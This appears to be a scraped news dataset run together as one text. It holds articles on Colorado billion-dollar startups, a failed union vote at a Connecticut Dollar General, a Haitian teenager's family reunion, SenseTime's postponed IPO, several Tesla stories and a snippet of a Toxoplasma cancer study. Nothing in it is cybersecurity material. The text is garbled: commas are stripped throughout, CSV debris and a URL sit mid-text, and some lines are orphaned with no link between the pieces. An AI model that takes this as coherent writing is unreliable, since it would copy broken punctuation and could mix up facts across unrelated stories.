SomaLogic began making money when it started selling its life-science tools to contract researchers. When SomaLogic began developing its SomaSignal tests respected investors began taking notice. These diagnostic tests use complex protein measurements and computationally extract precise health information. The company began selling SomaSignal tests to individuals and their health providers a potentially much larger market than just researchers.

The company is demonstrating its diagnostic tests in a few doctors’ offices in Colorado as well as other parts of the country.

Smythe said SomaLogic had a valuation of $350 million in 2020 and went to $1.2 billion after a funding round of $121 million led by New York-based Casdin Capital LLC just prior to SomaLogic’s IPO. SomaLogic began trading on Nasdaq in September after merging with the special-purpose acquisition company CM Life Sciences II Inc. driving its valuation past $2 billion.

Smythe said SomaLogic eventually would have reached the $1 billion valuation milestone with just its foundational tools but the combination of those tools used by researchers and now the promise of the SomaSignal diagnostic tests for health systems accelerated interest among investors that drove up the valuation.

“Who the investors are matters” Smythe said. “Smart money follows smart money. … Investors take note of other investors who did their due diligence and will then follow.”

Joining Casdin Capital in the crossover round were Farallon Capital Management Foresite Capital funds and accounts advised by T. Rowe Price Associates Inc. Blue Water Life Science Advisors Madryn Asset Management Fiscus Ventures and Reimagined Ventures (affiliates of Magnetar Capital) Monashee Investment Management Mossrock Capital Soleus Capital and others.

Smythe said the crossover round (the last one before going public) provides an “uptick in valuation with the money the round provides and a perception bounce based on who invests adding a premium to the valuation. … The IPO then provides an extra kick.”

It’s now a juggernaut protein platform.”

Solid Power Inc.

Solid Power reached the lofty valuation of $1.2 billion and unicorn status when it announced in November that it had agreed to merge with Decarbonization Plus Acquisition Corp. III (Nasdaq: DCRC) for the purpose of going public.

After completing the merger Solid Power officially went public Thursday trading under the ticker symbol SLDP.

The valuation took into account Solid Power’s management team led by co-founder and chief executive Doug Campbell the company’s capital structure plus current sales and projected sales of its solid-state batteries designed for electrical vehicles.

The solid-state batteries are an alternative to lithium-ion batteries used in electric vehicles competing directly with China which controls about 80% of the lithium-ion market.

The company was started as a spin-out business of the University of Colorado Boulder in 2012.

Campbell led the company through its early development and to its current phase of achieving the first step of producing these batteries at its production plant in Louisville.

A second production plant is ramping up in Thornton.

Campbell describes Solid Power’s rise as “dumb luck. … We were in the right place at the right time. The electrification of everything is happening.”

At the outset “We had some compelling science and a concept for a value-added business” Campbell said. “Our trajectory was typical: We needed to move fast raise capital and start producing batteries.”

Since its inception Solid Power has received $250 million in venture capital from approximately 20 investors.

Campbell said one key factor in Solid Power’s growth was when Ford Motor Co. and the BMW Group led a $130 million investment round in May. The two auto companies had previously supported Solid Power but Campbell emphasized that it was a big deal when “BMW and Ford leaned in. That’s when pun intended the rubber hit the road.” The two auto giants also placed executives on Solid Power’s board of directors.

JumpCloud Inc.

JumpCloud Inc. founded by David Campbell Larry Middle and Rajat Bhargava was recently valued at $2.56 billion following an investment round of $159 million.

The cloud-based directory platform for information technology professionals has raised $350 million since launching in 2012. JumpCloud founded in 2012 was formally launched in 2013 at TechCrunch Disrupt Battlefield as an automated server-management tool. JumpCloud’s cloud-based directory-as-a-service platform is used to manage users’ identity devices and access across things such as VPN Wi-Fi servers and workstations.

It also provides software that allows systems to enforce basic rules on the machines to do basic auditing and to run basic commands remotely.

Sovos Brands Holdings Inc.

Todd Lachman is the founder president and CEO of Sovos Brands Inc. which operates as a food and beverage company.

Lachman and the company’s chairman William Johnson had identified an opportunity within the broader food landscape to acquire and build a portfolio of brands with high-quality products that are in the early stages of growth.

Founded in 2017 the company with investment backing by global private-equity firm Advent International has acquired four early stage companies so far — Rao’s Noosa Birch Benders and Michael Angelo’s. The scaling of these brands has led the company to become the fastest-growing food company of scale in the United States Lachman said.

Management and underwriters of Sovos aimed to sell 23.3 million shares in a preliminary price range between $14 and $16 per share yet lackluster demand made that drop to $12 per share at the time of its initial public offering according to Seeking Alpha.

The company still had outstanding shares after the offering on Sept. 27. At the time of the offering its equity valuation was at $1.17 billion. This excluded a pro forma net debt load of around $535 million and a net debt position just below the half a billion mark. This values the company at around $1.67 billion on an enterprise basis according to Seeking Alpha.

Lachman said the biggest challenge Sovos has faced has been like many of its peers the COVID-19 pandemic and the associated industrywide supply-chain challenges.

“We’ve been able to keep up with the market demand for products in large part due to flexible manufacturing practices and a dedicated focus on our customers and consumers” Lachman said.

Uplight Inc.

Uplight Inc. is an energy-technology firm formed by the merger of Tendril Inc. and Simple Energy Inc.

Although Uplight didn’t reveal the size of the investment it says that the deal values the company at $1.5 billion — putting the company well into unicorn status. Founded in 2019 Uplight was formed when Tendril and Simple Energy merged and then acquired FirstFuel Ecotagious EEme and EnergySavvy.

The latest investment round was co-led by French energy efficiency firm Schneider Electric and power distributor AES Corp. (NYSE: AES). The group of private-equity investors was led by sustainability-focused fund Huck Capital Management LLC.

Uplight’s suite of software gives utilities data about how customers consume energy in their homes and businesses and then it offers ways to reduce their base power demand. It also provides a marketplace for consumers to find rebates and deals on energy-efficient appliances and electric vehicles.

It already counts major energy providers such as Xcel Energy Inc. (Nasdaq: XEL) ConEdison Inc. (NYSE: ED) and Duke Energy Inc. (NYSE: DUK) among its customer base of more than 80 energy providers.

In an earlier interview with BizWest Chief Operating Officer Angela Tucci said the funding will be used to reinforce its core businesses by recruiting more utility customers and attracting more energy-efficient device makers into its consumer products business along with an expansion from residential-focused efficiency services into the commercial-facing market.

“We can diversify from really a centricity in residential to much more in the commercial and industrial space… in ways that we couldn’t without this sort of backing or at least not at this pace” she said.

She also said the investment from Schneider which she estimates has parts in a third of every building on the planet positions the company to expand internationally.

However the company is laying roots in Boulder. It currently employs about 200 people in Colorado with the majority in the city and plans to ramp up hiring.

Boulder-based Rubicon Technology Partners will retain a minority stake in Uplight with the new deal coming into effect. That firm was Uplight’s majority investor and led its creation after the merger of Tendril Networks Inc. and Simple Energy Inc. in 2019 along with several other acquisitions that led to what is now Uplight.",,,,,,,,,

The worker revolt comes to a Dollar General in Connecticut A call to a union triggers one of the most lopsided battles of the ongoing low-wage-worker revolt

WINSTED Conn. — The afternoon shift workers at Dollar General No. 18060 had listened with growing panic as an executive accused their store manager of stealing. They could hear the yelling and threats in the back office a scene that had shaken all of them — especially Shellie Parsons.

In a life marked by poverty addiction and physical abuse Parsons 37 had come to see her store — a beige prefabricated building on the outskirts of town — as her haven a $15.75-an-hour pathway to a better life. She was desperately afraid of losing it.

And so after a brief discussion with a few trusted co-workers she headed to a nearby Stop & Shop grocery store where years earlier she recalled seeing a picket line walked back to the deli counter and asked one of the butchers whom she had never met whether he had a phone number for someone at their union. She dialed from the parking lot.

“Why does it got to be me?” she recalled thinking as the phone rang. She feared that talking to a union organizer could get her fired even as she worried that doing nothing would leave her and her colleagues vulnerable to the whims of upper management.

All over the country workers who had labored through a global pandemic for low pay and meager benefits were concluding that they deserved better from their bosses. Wages were rising and a wave of strikes was sweeping across the country hitting iconic American brands such as Kellogg’s and John Deere. And now Parsons’s phone call was setting off one of the most lopsided battles of the ongoing low-wage-worker revolt.

On one side: six Dollar General employees most of whom were making the minimum wage or just slightly above it. The group included a community college student a struggling musician who had recently moved back home and two single moms one of whom was Parsons. On the other: a company with yearly revenue approaching $34 billion more than 157000 employees and 17683 stores not one of which was unionized.

Four days after her Sept. 17 phone call Parsons and a few of her co-workers met with the union organizer. To prepare she had written out what they all hoped to gain in a letter that went through three drafts and that Parsons had finished in the front seat of her car.

“We all want to make sure we can make a living and not worry we will get fired for false accusations or made up things” she wrote. “Take our words serious don’t just brush them off. … We are your employees not strangers.”

The workers wanted more job security. They wanted a process to ensure that their complaints weren’t ignored. They wanted to know that their labor was valued and that they were respected.

Parsons and three of her co-workers signed it and handed it over to the organizer with Local 371 of the United Food and Commercial Workers union. Then they signed union cards authorizing an election scheduled for Oct. 22 — exactly one month away. To prevail all the signees — or four of the store’s six workers — would have to vote for the union.

Parsons and her fellow workers weren’t just trying to unionize; they were challenging a core aspect of the business model that has fueled Dollar General’s boom over the past decade.

“We believe our union free status is one reason we continue to grow and provide employment while many unionized companies have declined” the company wrote in third paragraph of its 2015 employee handbook.

Dollar General had carved out a niche that allowed it to thrive in communities where people were struggling to put food on the table and pay their bills and there were more and more of these places popping up throughout the country ever year.

To serve these communities Dollar General has concentrated on needs not wants. Each store typically consists of about 7400 square feet of cramped dimly lit aisles focusing on staples such as milk eggs and diapers as well as products such as pain relievers frying pans and motor oil. They are stocked in small sizes instead of bulk to keep prices low and profit margins high. Staffing is just as spare — typically six employees and a manager who often works six or seven days a week.

The approach had proved so successful that by 2020 there were more dollar stores — a category that includes Dollar Tree and Family Dollar — in the United States than all the Walmart Starbucks and McDonald’s locations combined. Of these Dollar General was the biggest of them all.

Before the vote at Parsons’s store the last serious effort to unionize a Dollar General came in December 2017 when workers in Auxvasse Mo. sought to become the first store in company history to join the UFCW.

Dollar General moved swiftly to quell the Auxvasse uprising. In the weeks before the vote company executives flew into town on a private jet and the vice president for human resources embedded herself in the store working alongside employees cleaning windows stocking shelves and making the case for rejecting the union according to workers and court documents.

The employees voted 4 to 2 to organize an outcome Dollar General spent the next 28 months fighting in the courts on the grounds that the vote was flawed. In the middle of its legal battle the company fired the employee who initially called the union for using a curse word in a private meeting with his district manager.

As part of a settlement approved by the National Labor Relations Board Dollar General agreed to compensate the fired worker. The company was also required to post a notice in the Auxvasse store’s break room acknowledging the monetary settlement and its workers’ right to organize.

“WE WILL NOT fire you because of your union membership or support” the notice read.

Instead the company took a more extreme step: It closed the store early last year only weeks after the U.S. Court of Appeals for the 8th Circuit ordered Dollar General to recognize and bargain with the union. Alan Bloom 70 a cashier said some of the store’s employees including its manager negotiated transfers. Bloom decided to retire.

He had voted for the union but now that the store was closing he wished he hadn’t. “For a while it felt revolutionary like we were going to change things” he said. “But that didn’t happen. The store just closed.”

Dollar General was the town’s only national chain and the only place — besides a gas station convenience store — that sold frozen food snacks and canned goods. “It’s left a hole in our town” said Ashley Steinbeck Auxvasse’s mayor. “It was such a convenience for everyone especially for elderly folks who can’t get around really well.”

In a statement Dollar General said the decision to close the store just weeks after it was ordered to negotiate with the union was based on an “assessment of the store’s future profitability.”

David Cook the president of UFCW Local 655 in Missouri suggested a different motive. “It’s a control issue” he said. “I don’t think anybody out there recognizes the value an employer like Dollar General puts on having an at-will workforce. ‘At will’ means I can fire you for any reason I want as long as it’s not color religion or ethnicity. It’s that ultimate power of intimidation. … You can’t put a value on that if you’re an employer — especially one the size of Dollar General.”

Parsons didn’t know any of this history when she placed her call to the union in September. She was just worried about losing a job that offered a sense of stability and predictability in a life that had often felt on the brink of collapse.

She had spent her teenage years in foster care battled a heroin addiction and served a year in prison but by the time she started at Dollar General in 2019 she was beginning to pull her life together. Other than a brief relapse and terrifying overdose in early 2019 she had been drug-free for most of the past 12 years. She was trying to end an abusive relationship and her boss and colleagues had offered support noticing the bruises on her body and encouraging her to leave her partner.

Aside from Bella her 8-year-old daughter Parsons’s store had become the most important thing in her life a place where she felt successful earning pay raises and a promotion to assistant manager.

“I don’t have any family. I have no one” she said. “And when I started working for Dollar General I got away from my lifelong abuser and I survived and I got a family and a future.”

Parsons didn’t expect better pay or benefits from unionizing. She just wanted to hold on to what she had.

In the days after she and her co-workers signed union cards the company hired five anti-union consultants each of whom was paid $2700 a day according to documents filed with the Labor Department. It dispatched three out-of-state executives to the store who shadowed the employees for the month working alongside them. Sometimes the executives talked baseball hunting or music with the store employees.

Other times they warned them about the union which they said would make them pay costly dues and ruin their relationship with their store manager whom they liked and admired.

Mostly the executives seemed to be spying on them the employees said. About a week after they arrived at the store Jake Serafini 31 was restocking an aisle with one of his co-workers he recalled. “I would never be able to do this job for $7.25 an hour” he said thinking of the minimum wage in North Carolina where he had lived before returning home to Winsted.

Seconds later Serafini said one of the corporate executives emerged from a nearby aisle. “The minimum wage in Connecticut is $13 an hour” he said.

Serafini a part-time musician agreed but noted that it was still a “little low” given the state’s high cost of living. He didn’t think much about the incident until the same executive spotted him a few days later stacking pizzas in a freezer that was badly overstocked.

“It looks there are sparks coming out of your ears” the executive said.

“Look at this f---ing bullsh--” Serafini replied pointing to the mess. The executive offered to show him how to fix the oversupply problem and Serafini said he apologized for cursing.

After his shift Serafini said two of his co-workers approached as he was walking to his car and told him they had been ordered to sign statements saying they had heard him curse. Serafini’s store manager called that evening and fired him. In his five months with the company Serafini hadn’t missed a shift and had no disciplinary write-ups.

“My heart is breaking” Serafini recalled his boss saying. “I’m doing everything I can on my end. We’re going to get you back.”

The dismissal shook some of Serafini’s co-workers who were convinced that he was fired because he was pro-union or possibly because the Dollar General executives believed he had instigated the union drive. It incensed Parsons who felt responsible. Serafini had been filling in for her on the day he was fired.

At the union’s request Parsons did interviews with CNN HuffPost and the Hartford Courant. She recorded a video for More Perfect Union a labor advocacy group in which she talked about Serafini’s dismissal. “The only people that can save us is a union” she said on the video.

Six days before the vote Parsons believed that three out of six employees including Serafini who despite his dismissal was allowed to vote were pro-union. One was wavering a worker named Jen whose vote was crucial. The woman did not respond to requests for comment from The Washington Post for this story. Parsons said that a Dollar General executive had warned Jen about the closing of the Auxvasse store and suggested that the same thing could happen in Connecticut.

“I need you to call Jen and talk to her” Parsons texted the UFCW organizer Jessica Petronella. “They are getting to her. We have to act Very Quickly or we are going to lose her.”

Three days before the vote Parsons Jen and Petronella met in a supermarket parking lot a short drive down the highway from the Dollar General. It was a spot where they hoped that the company’s executives and consultants who now outnumbered the workers wouldn’t see them.

Petronella said she asked Jen to draft a statement describing what she considered to be the company’s threat to close the store along with an account of Serafini’s firing. Jen wrote that the executive told her to “look into the dollar general store that had been closed” and shared that Serafini’s firing may have been related to corporate’s belief that he had been the first to call the union.

Dollar General in response to questions from The Post said that no threats were made to close the Connecticut store and denied that Serafini was “treated unlawfully.”

Petronella intended to give Jen’s statement to the National Labor Relations Board which oversees union elections to ensure they are fair. She also saw the letter as a positive sign that Jen still supported the union.

On election day the NLRB set up a small white tent in the parking lot of the Dollar General. Parsons who agreed to serve as an observer for the union arrived at 8:30 a.m. and cast her ballot. A worker representing the company occupied a second table. For the next two hours Parsons sat watched and nervously waited as her co-workers cycled through.

Dollar General was challenging Serafini’s ballot but he was still allowed to vote. “It’s a great day for democracy” he told Parsons as he entered the tent.

“Absolutely!” Parsons replied.

A second co-worker who backed the union grinned at Parsons as he dropped his ballot in the cardboard box. A good sign. There were two workers both part-timers who hadn’t supported the union. Parsons assumed they both voted no.

She was most worried about Jen who stood over her ballot for several seconds shaking her head as if she was thinking Parsons said. Parsons tried to catch her eye but Jen hurried past her.

At 11:05 a.m. an NLRB representative counted the votes. To prevail Dollar General needed at least three of the six workers to vote against the union. The first two votes were both no. Then there was a yes followed by a brief pause as the NLRB representative unfolded the next ballot. Parsons breathed in through her light blue surgical mask.

“No” the NLRB official read.

At first Parsons didn’t believe it. She walked out of the tent and into the sunlight lit a cigarette and inhaled deeply. One of her co-workers called Serafini to let him know the outcome.

“I hate to be the one to tell you” he began.

“You’re kidding” Serafini replied. He had assumed that the union would win and that he would be back to work in a week or two. Now he felt alone.

Parsons and Petronella drove to a nearby McDonald’s to figure out what had happened and talk about their next steps. Tears streamed down Parsons’s face. She believed that the election hadn’t been fair that Dollar General had “polluted” her colleagues’ minds with falsehoods and fear.

“Obviously Jen voted no” Petronella said.

Over the course of her life Parsons had grown accustomed to feeling abandoned — by her parents the foster-care system the police and the courts. Now she wanted the union to stand with her appeal the vote to the NLRB and keep fighting.

“What do we do now?” she asked Petronella.

For Petronella and the union the answer was to move on to other battles. She could have sought an order that would have forced Dollar General to bargain with the union. “You have to hire lawyers and it ends up costing a lot” Petronella said. For a company like Dollar General the expense was nothing. But the union’s resources were limited.

Petronella decided that it would be faster and cheaper to wait 12 months and petition for another union vote if Parsons and her co-workers were still interested. Her last piece of unfinished business from the Dollar General organizing effort was Serafini who with the help of the union and a Labor Department lawyer was negotiating a wrongful-dismissal settlement with Dollar General.

Petronella wanted Dollar General to have to acknowledge publicly its agreement with Serafini just as it had done in Missouri.

Serafini’s immediate goal was to pay some bills and move on with his life perhaps becoming a social worker. His dismissal he said had revealed what Dollar General really thought of its workers. “You have people go above and beyond for a minimum-wage job and then get tossed because a union might mean it costs a little more to run the store. It’s all about greed” he said. “It just feels gross.”

For Parsons there was only one option after the union organizing effort failed: A few weeks after the election her alarm clock woke her at 5:15 a.m. giving her just enough time to stop by the methadone clinic for her daily dose before heading off to work.

The Dollar General executives had returned home and the store had settled back into its old rhythms. Parsons helped unload a “humongous truck” that arrived that morning and fell off a ladder while trying to retrieve a box of adult diapers from a storage shelf for an elderly customer. In the afternoon she headed off to a second job cleaning houses. She lugged bags of supplies and a scuffed yellow vacuum up the driveway of a small brick ranch house her back still throbbing from her fall. After only a few minutes of work her forehead glistened with sweat.

Parsons was more than $5000 behind on her electricity bill but was determined to use the money from her housekeeping jobs to pay the lawyer who was helping her fight for custody of her daughter. She saw Bella three times a week — visits that began with tense handoffs that Parsons knew took the heaviest toll on Bella.

After police charged Parsons’s ex with “threatening” behavior and “breach of peace” the courts granted Parsons a restraining order and mandated that she and her former partner exchange Bella in a well-lit public spot. For now it was the Big Y supermarket. Inside the store the two parents stood about 10 yards apart recording each other with their phones as their 8-year-old daughter ran with her head down from her father to her mother.

“Today Mommy doesn’t have too much money” Parsons said as she hurriedly outlined some options for their three-hour visit. Bella chose a $5.75 matinee of the new Marvel movie and Parsons began firing questions at her.

“Have you taken a shower lately?”

“What’s Daddy feeding you?”

“You’re still coughing baby. Are you taking your medicine?”

Three-quarters of the way through the movie Bella started to worry that they were going to be late for the court-mandated 8 p.m. drop-off with her dad. So they left early giving Parsons just enough time for a quick cigarette break before they sped through the Wendy’s drive-through. Her feet were sore. Her back still ached. Her gas gauge hovered just above empty. Parsons lit a cigarette in the parking lot. A few kernels of movie theater popcorn tossed by a giggling Bella struck her on the cheek.

Back at the Big Y they repeated the recorded drop-off in reverse. This was the worst part of Parsons’s day the time she felt most alone. “I fight addiction. I fight for my job. I fight for my kid. I fight for my survival” she said. “Every single way I turn I have to fight.”

One thing she could no longer afford to fight was Dollar General and so these days she was focused relentlessly on the company’s positives. Dollar General had dismissed the district manager who accused her boss of stealing — falsely employees said — and replaced him with a new person who seemed fair. The new district manager had recently promised to start reimbursing store employees for their mileage when they had to drive to the bank to drop off the day’s deposits. It wasn’t yet clear whether they would be reimbursed thousands of dollars for earlier unpaid trips.

“After the election I started to find out the truth about Dollar General” Parsons said. “It is not what we thought. If they knew what was going on they would have fixed it earlier. Really it was just a couple of bad people. Everyone has their flaws but Dollar General is great people.”

Parsons didn’t regret calling the union. Without the organizing effort she believed the problems at her store would never have been addressed. “It helped 100 percent” she said. But she also wasn’t upset that the unionizing push had failed. “If we won honestly I don’t know anymore” she continued. “I don’t know if it’d be different. Everything is just confusing.”

Two weeks before Thanksgiving Parsons received another bit of good news: Someone had posted on Parsons’s employee group text chat that the store would be closed on the holiday a change from previous years when it had been open for extended hours. “The union isn’t involved and they are still doing it” she said.

But it turned out that the company wasn’t actually doing it. The store was open from 7 a.m. to 10 p.m. on Thanksgiving Day just as it had been the previous year and Parsons was scheduled to work.

She didn’t let it bother her. She needed the money. She worked an 11-hour shift and then rushed to the Big Y where Bella was waiting.

This is what Love Anchise a Haitian adolescent rejected by her parents experienced. With the help of UNICEF and partners she was reunited with her family three months later.

Tozia December 11 2021 - This Monday in November is a day to remember for Love Anchise who returns home to find her father. “I am very happy to return home. My parents encouraged me. My brother my aunt and my mother-in-law too” she said in the vehicle that brought her from Les Cayes in the South Department to Tozia in Grand’Anse Haiti.

Getting pregnant took a toll on the 15-year-old. It turned into a nightmare when an earthquake struck and destroyed the foster family's home where she lived because she was rejected by her parents. “I gave birth on November 14 at 2:30 a.m. Everything went well. I'm well. My little girl too” she said smiling.

With the help of a midwife Love gave birth three months to the day after the earthquake in the house next door where her foster family have been relocated. Long before that the adolescent girl experienced health issues and was hospitalized and followed by a gynecologist for eight days. The earthquake postponed her family reunification that had been scheduled for the end of August as her father's house in Tozia was also damaged.",https://news.google.com/articles/CBMiUGh0dHBzOi8vd3d3LnlhaG9vLmNvbS92aWRlby9jaGluYXMtc2Vuc2V0aW1lLXdpdGhkcmF3LTc2Ny1taWxsaW9uLTAyMzYwODgwNi5odG1s0gEA?hl=en-US&gl=US&ceid=US%3Aen,China's SenseTime postpones $767 million Hong Kong IPO after U.S. ban,"By Kane Wu and Scott Murdoch

(Reuters) -Chinese artificial intelligence start-up SenseTime Group postponed its $767 million Hong Kong initial public offering (IPO) on Monday after being placed on a U.S. investment blacklist.

SenseTime said it remained committed to completing the offering and would publish a supplemental prospectus and an updated listing timetable.

Reuters first reported earlier on Monday the company's plan to withdraw the offering and update its prospectus to include the potential impact of the U.S. investment ban with the aim of relaunching the IPO process.

SenseTime had planned to sell 1.5 billion shares in a price range of HK$3.85 to HK$3.99 according to its regulatory filings. That would raise up to $767 million a figure that had already been trimmed earlier this year from a $2 billion target.

However instead of setting its listing price on Friday as scheduled it found itself in urgent talks with the Hong Kong Stock Exchange and its lawyers over the future of the deal amid reports about the looming blacklist.

SenseTime did not provide details on the timetable for a revised IPO in its filing to the Hong Kong Stock Exchange on Monday.

""The company remains committed to completing the global offering and the listing soon"" it said in the filing.

One source said the company was trying to move quickly to avoid the regulatory requirement to completely refile the IPO after Jan. 9 when its financial numbers in the current prospectus would need to be updated. The company had retained around $450 million from cornerstone investors and could expect most of them to stay in the deal the source added.

""Even if the company offers an updated prospectus with more risk factors and goes ahead with a public listing we expect the investor sentiment to be low which will likely impact future pricing of its shares and their performance post-IPO"" said Shifara Samsudeen a LightStream Research analyst who publishes on Smartkarma told Reuters.

FULL REFUND

The company said it would refund all application monies in full without interest to all applicants who subscribed its shares in the offering process.

The U.S. Treasury added SenseTime to a list of ""Chinese military-industrial complex companies"" accusing the company of having developed facial recognition programmes that can determine a target's ethnicity with a particular focus on identifying ethnic Uyghurs.

U.N. experts and rights groups estimate more than a million people mainly Uyghurs and members of other Muslim minorities have been detained in recent years in a vast system of camps in China's far-west region of Xinjiang.

Some foreign lawmakers and parliaments as well as the U.S. Secretaries of State in both the Biden and Trump administrations have labelled the treatment of Uyghurs as genocide citing evidence of forced sterilisations and deaths inside the camps. China denies these claims and says Uyghur population growth rates are above the national average.

SenseTime said in a statement on Saturday it ""strongly opposed the designation and accusations that have been made in connection with it"" calling the accusations ""unfounded"".

""There remains a large number of questions that need to be answered such as the impact of blacklisting and disruptions to the operations as well as the impact on SenseTime's plans of pursuing global expansion"" said LightStream's Samsudeen.

SenseTime was due to be one of the biggest deals in the third quarter in Hong Kong and its postponement adds to the ongoing weakness in the city's IPO market.

There has been $41.1 billion raised in IPOs and secondary listings so far in 2021 compared with $50.26 billion over the same period last year according to Refinitiv figures.

China Tourism Group shelved a plan to raise about $5 billion in its secondary listing earlier in December citing uncertain financial market conditions.

SenseTime's IPO was the most high profile listing for HSBC this year which was a joint sponsor with China International Capital Corporation (CICC) and Haitong International.

He says that “Tesla Cybertruck can come in any color as long as it’s nothing.”

One of the most unique features of the Cybertruck is its stainless-steel exoskeleton:

“Cybertruck is built with an exterior shell made for ultimate durability and passenger protection. Starting with a nearly impenetrable exoskeleton every component is designed for superior strength and endurance from Ultra-Hard 30X Cold-Rolled stainless-steel structural skin to Tesla armor glass.”

It’s an interesting design that is going to make the electric pickup truck very tough but it is also limiting the color options.

While steel can be made to have different colors there are limitations and it can’t be painted very well.

Musk previously said that owners would need to apply a wrap to the Cybertruck in order to get the electric pickup truck in any other color.

At one point the CEO suggested that Tesla could offer factory wraps for the Cybertruck.

Yesterday a new Tesla Cybertruck prototype was spotted and Musk was asked about whether or not Tesla will offer wraps.

The CEO answered:

“ Not at first but there are many third-party options for wrapping.”

It suggests that Tesla could eventually offer wraps but the automaker is not making it a priority and buyers would have to turn to third parties at first.

Musk then added:

“Cybertruck can have any color you want so long as it’s nothing.”

This appears to be a reference to a famous statement by Henry Ford who is believed to have said “any customer can have a car painted any color that he wants so long as it is black” in reference to not offering different colors for the Model T.

As for the Cybertruck the only color is actually nothing since the vehicle is not even painted. The stainless steel is completely exposed.

We previously posted renders of what the Cybertruck would look like in different colors with wraps.

If you were to get a Cybertruck would you wrap it and if so in what color?

A worker filed a lawsuit alleging sexual harassment and retaliation at Tesla's Fremont factory.

It's the second lawsuit alleging sexual harassment against the company from a female worker in less than 30 days.

Tesla and Elon Musk did not respond to a request for comment about the lawsuit.

A Tesla employee filed a lawsuit on Wednesday accusing the electric-carmaker of retaliation and failing to prevent ""a pattern of continuous and pervasive"" sexual harassment at its Fremont factory.

Erica Cloud who has worked as an assembly line worker at the Tesla factory filed a lawsuit in California's Alameda County Superior Court. The lawsuit accuses Tesla and other defendants including Cloud's former manager of allowing the worker to be continually subjected to harassment and unwanted advances.

Tesla the manager cited in the lawsuit and CEO Elon Musk did not respond to a request for comment from Insider.

Cloud's lawsuit stated that she faced ""sexual harassment on a near-daily basis"" from her former manager. The lawsuit said the manager would ""get on his knees and propose marriage"" as well as ""hug and massage"" her and that she rejected the advances on multiple occasions. In the spring of 2020 the manager told Cloud ""on several occasions that she is 'blackenese' and he 'is big down there' referring to his penis"" according to the suit. The manager's actions were highly aggressive and caused her to ""fear for her safety"" the lawsuit said.

The lawsuit said that it took two to three months for Tesla's Human Resources department to address Cloud's complaints after she reported the manager to the team. After Cloud stopped working with the manager she said she was subjected to ""a hostile work environment"" as a result of reporting the alleged harassment. The lawsuit said that Cloud was sent home early or asked not to work on several occasions for ""arbitrary reasons"" and lost wages bonuses and benefits as a result.

Cloud and her lawyers say Tesla broke the law specifically the Fair Employment and Housing Act by failing to prevent the alleged sexual harassment and retaliating against Cloud after she reported the allegations. Attorneys are seeking compensation and damages declaratory and injunctive relief and attorneys' fees.

Cloud's case comes a few weeks after another worker alleged sexual harassment at the factory. In November Jessica Barraza filed a lawsuit against Tesla that said the company operates like a ""frat house."" At the time The Washington Post reported that three current and former Tesla workers at the Fremont factory said they had also witnessed or experienced sexual harassment at the site.

The month before a court ordered Tesla to pay nearly $137 million after a federal court found an employee at the Fremont plant had been subjected to racial harassment.

Most of the time these additions are included in the release notes but sometimes the automaker sneaks something in without including it in the release notes when they really should.

That’s the case with one of the latest feature discovered this weekend. Your Tesla can now tell you if your tires are wearing unevenly and if your tread depth is too low.

According to photos shared with us a new error message appears on your screen warning you of the potential problem. It also advises you to schedule a service appointment for a tire inspection and rotation.

Naturally the question after seeing this new feature is – how is the car able to measure your tread depth? While it might seem like magic it is actually quite simple.

You might not be able to visually notice the difference but as your tire loses tread it is getting smaller. When this happens the tire begins rotating faster than it was when it was new.

What your Tesla is likely doing is measuring how many times the wheel is rotating and once it reaches a certain point it knows that the tire tread is getting low.

Similarly if one tire is rotating faster than the other it would also know if the tread is wearing unevenly.

According to the owners who shared this new message with us they are on the 2021.44.5 software update.

Have you also seen this message? Are your tires wearing unevenly or have low tread?

Back in November PepsiCo CEO Ramon Laguarta remarked that his company was expecting its first Tesla Semi deliveries in the fourth quarter. This was a surprise to electric vehicle enthusiasts as Tesla CEO Elon Musk noted during the 2021 Annual Shareholder Meeting that the Class 8 all-electric hauler would be hitting volume production in 2023. Yet if recent sightings at the Giga Nevada area are any indication it appears that the Semi is now in limited production — and Tesla is doing some interesting tests with its freshly made trucks.

The Semi’s new video which was shared on YouTube by Tesla advocate Sawyer Merritt was shot last Friday near Gigafactory Nevada. The truck in the footage was reportedly manufactured in a production facility that has been constructed near Tesla’s massive battery plant. While the Semi in the footage looked quite similar to the white painted updated prototypes that have been spotted several times this year the new truck reportedly did not have any stickers from the Department of Transportation nor did it have manufacturer plates.

Only @elonmusk would tell his engineering team to build a semi tractor with the same turning circle and 0-60 time as a Porsche. 🤣$TSLA https://t.co/F4Hx9E7I5d pic.twitter.com/ryh9cf3sab — James Stephenson (@ICannot_Enough) December 11 2021

Sightings of the Tesla Semi have been going on for some time but what makes last Friday’s footage quite special was that it showcased a clear tire-shredding acceleration run from the Class 8 all-electric truck. The footage was brief lasting only two and a half minutes but it was enough to show just how quick the Semi really is when it accelerates at full speed. Granted the Semi was not pulling a trailer when it was captured on video but it’s still remarkable to see such a large all-electric vehicle run like a sports car on the road.

Also quite interesting was the Semi’s incredibly tight turning radius. After running the length of the production facility near Giga Nevada the Semi simply took a U-turn to head back. The vehicle then proceeded to showcase its turning circle several more times and just like its acceleration the Semi’s turning radius is pretty remarkable. This bodes well for the Semi’s maneuverability which would likely help it stand apart from its more conventional more traditional competitors.

If recent reports are accurate and the Tesla Semi has indeed entered limited production it would suggest that the company might be working with some of its first customers as part of its efforts to refine and finalize the Class 8 hauler. Considering CEO Laguarta’s statements last November PepsiCo could very well be one of these first customers. PepsiCo has been dropping hints about its upcoming Tesla Semi fleet as of late after all. Earlier this year the company noted that it was expecting to receive 15 units of the Semi by the end of 2021. PepsiCo has also received a permit for a Tesla Megacharger at its Modesto California facility.

The defective mutants of de novo pyrimidine biosynthesis are uracil auxotrophs which are nonreplicating and avirulent in mice [40 41]. In order to study the therapeutic effects of the nonreplicating T. gondii on 4T1 mouse breast cancer we constructed the uracil auxotrophic mutant with CRISPR/Cas9 technology. The construction schematic diagram is shown in Additional file 1: Figure S1a. The PCR and qRT-PCR results demonstrated that the RH-Δompdc mutant of T. gondii was successfully constructed (Additional file 1: Figure S1b c).

